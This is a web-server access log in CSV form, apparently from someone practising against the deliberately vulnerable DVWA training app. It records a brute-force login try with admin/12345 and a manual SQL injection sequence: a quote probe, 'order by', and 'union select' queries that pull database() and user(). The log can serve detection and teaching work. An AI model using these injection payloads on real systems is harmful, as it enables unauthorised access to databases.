timestamp,message
1618840927186,"{ ""time"":""2021-04-19T14:02:02.397Z"", ""process"":""1447"", ""filename"":""/var/www/html/DVWA/vulnerabilities/brute/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/brute/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/index.php""}"
1618840933186,"{ ""time"":""2021-04-19T14:02:08.494Z"", ""process"":""1890"", ""filename"":""/var/www/html/DVWA/vulnerabilities/brute/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/brute/index.php"", ""query"":""?username=admin&password=12345&Login=Login"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/brute/""}"
1618840937182,"{ ""time"":""2021-04-19T14:02:14.309Z"", ""process"":""4635"", ""filename"":""/var/www/html/DVWA/vulnerabilities/exec/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/exec/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/brute/?username=admin&password=12345&Login=Login""}"
1618840941186,"{ ""time"":""2021-04-19T14:02:17.000Z"", ""process"":""6875"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":"""",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/exec/""}"
1618840981186,"{ ""time"":""2021-04-19T14:02:56.262Z"", ""process"":""2022"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/""}"
1618841000186,"{ ""time"":""2021-04-19T14:03:15.408Z"", ""process"":""2855"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1&Submit=Submit""}"
1618841027186,"{ ""time"":""2021-04-19T14:03:42.982Z"", ""process"":""1756"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+order+by+1+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1&Submit=Submit""}"
1618841061186,"{ ""time"":""2021-04-19T14:04:16.145Z"", ""process"":""1873"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+1%2C2+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+order+by+1+%23&Submit=Submit""}"
1618841079186,"{ ""time"":""2021-04-19T14:04:34.625Z"", ""process"":""5417"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+1%2C2+%23&Submit=Submit""}"
1618841094186,"{ ""time"":""2021-04-19T14:04:50.002Z"", ""process"":""1965"", ""filename"":""/var/www/html/DVWA/vulnerabilities/sqli/index.php"", ""remoteIP"":""91.195.99.178"", ""host"":""ec2-18-116-12-178.us-east-2.compute.amazonaws.com"", ""request"":""/vulnerabilities/sqli/index.php"", ""query"":""?id=1%27+union+select+null%2Cuser%28%29+%23&Submit=Submit"",""method"":""GET"", ""status"":""200"", ""userAgent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"",""referer"":""http://ec2-18-116-12-178.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/?id=1%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit""}"
